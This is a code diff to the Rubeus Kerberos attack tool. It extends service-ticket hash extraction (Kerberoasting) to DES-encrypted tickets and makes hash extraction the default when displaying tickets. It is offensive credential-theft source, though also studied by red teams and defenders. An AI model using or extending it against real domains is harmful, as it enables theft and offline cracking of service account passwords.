@@ -519,7 +519,7 @@ namespace Rubeus
             }
         }
 
-        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = false, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null, byte[] keyList = null)
+        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = true, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null, byte[] keyList = null, string desPlainText = "")
         {
             // displays a given .kirbi (KRB_CRED) object, with display options
 
@@ -616,15 +616,15 @@ namespace Rubeus
                 else if (extractKerberoastHash && (serviceName != "krbtgt"))
                 {
                     // if this isn't a TGT, try to display a Kerberoastable hash
-                    if (!eType.Equals(Interop.KERB_ETYPE.rc4_hmac) && !eType.Equals(Interop.KERB_ETYPE.aes256_cts_hmac_sha1))
+                    if (!eType.Equals(Interop.KERB_ETYPE.rc4_hmac) && !eType.Equals(Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                     {
                         // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
                         //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
                         Console.WriteLine("\r\n[!] Service ticket uses encryption type '{0}', unable to extract hash and salt.", eType);
                     }
-                    else if (eType.Equals(Interop.KERB_ETYPE.rc4_hmac))
+                    else if (eType.Equals(Interop.KERB_ETYPE.rc4_hmac) || eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                     {
-                        Roast.DisplayTGShash(cred);
+                        Roast.DisplayTGShash(cred, desPlainText: desPlainText);
                     }
                     else if (!String.IsNullOrEmpty(serviceUser))
                     {
@@ -649,7 +649,8 @@ namespace Rubeus
                 
                 try
                 {
-                    var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey);
+                    bool displayBlockOne = true;
+                    var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey, false, displayBlockOne);
                     PACTYPE pt = decryptedEncTicket.GetPac(asrepKey);
                     if (pt == null)
                     {
